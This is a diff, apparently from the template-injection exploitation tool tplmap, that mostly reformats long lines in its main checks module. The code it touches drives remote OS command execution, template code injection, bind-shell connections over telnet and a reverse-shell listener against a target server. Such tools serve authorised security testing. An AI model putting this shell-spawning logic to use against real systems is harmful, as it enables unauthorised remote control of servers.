@@ -2,7 +2,6 @@ import socket
 import telnetlib
 import urllib.parse as urlparse
 
-from tplmap.core.channel import Channel
 from tplmap.core.clis import MultilineShell, Shell
 from tplmap.core.tcpserver import TcpServer
 from tplmap.plugins.engines.dot import Dot
@@ -52,9 +51,7 @@ plugins = [
 def _print_injection_summary(channel):
 
     prefix = channel.data.get("prefix", "").replace("\n", "\\n")
-    render = channel.data.get("render", "%(code)s").replace("\n", "\\n") % (
-        {"code": "*"}
-    )
+    render = channel.data.get("render", "%(code)s").replace("\n", "\\n") % ({"code": "*"})
     suffix = channel.data.get("suffix", "").replace("\n", "\\n")
 
     if channel.data.get("evaluate_blind"):
@@ -188,8 +185,7 @@ def check_template_injection(channel):
             % (
                 {
                     "execute": "\n    --os-shell\t\t\t\tRun shell on the target\n    --os-cmd\t\t\t\tExecute shell commands"
-                    if channel.data.get("execute")
-                    and not channel.data.get("execute_blind")
+                    if channel.data.get("execute") and not channel.data.get("execute_blind")
                     else "",
                     "execute_blind": "\n    --os-shell\t\t\t\tRun shell on the target\n    --os-cmd\t\t\tExecute shell commands"
                     if channel.data.get("execute_blind")
@@ -239,14 +235,10 @@ def check_template_injection(channel):
             elif channel.args.get("os_shell"):
                 log.info("Run commands on the operating system.")
 
-                Shell(
-                    current_plugin.execute, "%s $ " % (channel.data.get("os", ""))
-                ).cmdloop()
+                Shell(current_plugin.execute, "%s $ " % (channel.data.get("os", ""))).cmdloop()
 
         else:
-            log.error(
-                "No system command execution capabilities have been detected on the target."
-            )
+            log.error("No system command execution capabilities have been detected on the target.")
 
     # Execute template commands
     if channel.args.get("tpl_code") or channel.args.get("tpl_shell"):
@@ -264,17 +256,11 @@ def check_template_injection(channel):
             if channel.args.get("tpl_code"):
                 print(call(channel.args.get("tpl_code")))
             elif channel.args.get("tpl_shell"):
-                log.info(
-                    "Inject multi-line template code. Press ctrl-D to send the lines"
-                )
-                MultilineShell(
-                    call, "%s > " % (channel.data.get("engine", ""))
-                ).cmdloop()
+                log.info("Inject multi-line template code. Press ctrl-D to send the lines")
+                MultilineShell(call, "%s > " % (channel.data.get("engine", ""))).cmdloop()
 
         else:
-            log.error(
-                "No code evaluation capabilities have been detected on the target"
-            )
+            log.error("No code evaluation capabilities have been detected on the target")
 
     # Perform file upload
     local_remote_paths = channel.args.get("upload")
@@ -323,8 +309,7 @@ def check_template_injection(channel):
             for idx, thread in enumerate(current_plugin.bind_shell(bind_shell_port)):
 
                 log.info(
-                    "Spawn a shell on remote port %i with payload %i"
-                    % (bind_shell_port, idx + 1)
+                    "Spawn a shell on remote port %i with payload %i" % (bind_shell_port, idx + 1)
                 )
 
                 thread.join(timeout=1)
@@ -334,24 +319,19 @@ def check_template_injection(channel):
 
                 try:
 
-                    telnetlib.Telnet(
-                        urlparsed.hostname, bind_shell_port, timeout=5
-                    ).interact()
+                    telnetlib.Telnet(urlparsed.hostname, bind_shell_port, timeout=5).interact()
 
                     # If telnetlib does not rise an exception, we can assume that
                     # ended correctly and return from `run()`
                     return
                 except Exception as e:
                     log.debug(
-                        "Error connecting to %s:%i %s"
-                        % (urlparsed.hostname, bind_shell_port, e)
+                        "Error connecting to %s:%i %s" % (urlparsed.hostname, bind_shell_port, e)
                     )
 
         else:
 
-            log.error(
-                "No TCP shell opening capabilities have been detected on the target"
-            )
+            log.error("No TCP shell opening capabilities have been detected on the target")
 
     # Accept reverse tcp connections
     reverse_shell_host_port = channel.args.get("reverse_shell")
@@ -366,11 +346,9 @@ def check_template_injection(channel):
             # Run tcp server
             try:
                 TcpServer(int(port), timeout)
-            except socket.timeout as e:
+            except socket.timeout:
                 log.error("No incoming TCP shells after %is, quitting." % (timeout))
 
         else:
 
-            log.error(
-                "No reverse TCP shell capabilities have been detected on the target"
-            )
+            log.error("No reverse TCP shell capabilities have been detected on the target")
